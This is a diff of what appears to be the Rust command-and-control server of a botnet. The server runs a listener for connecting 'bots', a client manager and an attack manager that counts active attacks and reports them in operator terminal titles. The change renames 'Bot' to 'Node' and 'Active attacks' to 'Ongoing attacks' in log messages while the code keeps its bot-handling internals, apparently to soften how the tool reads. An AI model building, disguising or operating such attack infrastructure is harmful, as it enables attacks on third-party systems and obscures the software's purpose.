@@ -165,7 +165,7 @@ async fn main() -> Result<()> {
     });
     info!("🌐 Starting User server on {}:{}", config.user_server_ip, config.user_server_port);
     let user_listener = TcpListener::bind(format!("{}:{}", config.user_server_ip, config.user_server_port)).await?;
-    info!("🤖 Starting Bot server on {}:{}", config.bot_server_ip, config.bot_server_port);
+    info!("🤖 Starting Node Listener on {}:{}", config.bot_server_ip, config.bot_server_port);
     let bot_listener = TcpListener::bind(format!("{}:{}", config.bot_server_ip, config.bot_server_port)).await?;
     info!("✓ All servers started successfully");
     info!("========================================");
@@ -229,15 +229,15 @@ async fn main() -> Result<()> {
         loop {
             match bot_listener.accept().await {
                 Ok((conn, addr)) => {
-                    info!("🤖 Bot connection from {}", addr);
+                    info!("🤖 Node connection from {}", addr);
                     let state = state_clone.clone();
                     tokio::spawn(async move {
                         if let Err(e) = handle_bot_connection(conn, addr, state).await {
-                            error!("Bot connection error: {}", e);
+                            error!("Node connection error: {}", e);
                         }
                     });
                 }
-                Err(e) => error!("Error accepting bot connection: {}", e),
+                Err(e) => error!("Error accepting node connection: {}", e),
             }
         }
     });
@@ -250,13 +250,13 @@ async fn main() -> Result<()> {
             error!("User server task terminated unexpectedly");
         }
         _ = bot_task => {
-            error!("Bot server task terminated unexpectedly");
+            error!("Node server task terminated unexpectedly");
         }
     }
     info!("📊 Final statistics:");
-    info!("   Bots: {}", state.bot_manager.get_bot_count().await);
+    info!("   Nodes: {}", state.bot_manager.get_bot_count().await);
     info!("   Clients: {}", state.client_manager.get_client_count().await);
-    info!("   Active attacks: {}", state.attack_manager.get_active_count().await);
+    info!("   Ongoing attacks: {}", state.attack_manager.get_active_count().await);
     info!("✓ Server shutdown complete");
     Ok(())
 }
@@ -272,7 +272,7 @@ async fn periodic_cleanup(state: Arc<AppState>) {
         let bot_count = state.bot_manager.get_bot_count().await;
         let client_count = state.client_manager.get_client_count().await;
         let attack_count = state.attack_manager.get_active_count().await;
-        debug!("Cleanup: {} bots, {} clients, {} attacks", bot_count, client_count, attack_count);
+        debug!("Cleanup: {} nodes, {} clients, {} attacks", bot_count, client_count, attack_count);
     }
 }
 async fn update_titles(state: Arc<AppState>) {
@@ -285,7 +285,7 @@ async fn update_titles(state: Arc<AppState>) {
         let attack_count = state.attack_manager.get_active_count().await;
         for client in clients {
             let title = format!(
-                "    [{}]  Servers: {} | Attacks: {}/{} |  ☾☼☽  | User: {} ({}) [{}]",
+                "    [{}]  Nodes: {} | Attacks: {}/{} |  ☾☼☽  | User: {} ({}) [{}]",
                 spin_chars[spin_index],
                 bot_count,
                 attack_count,
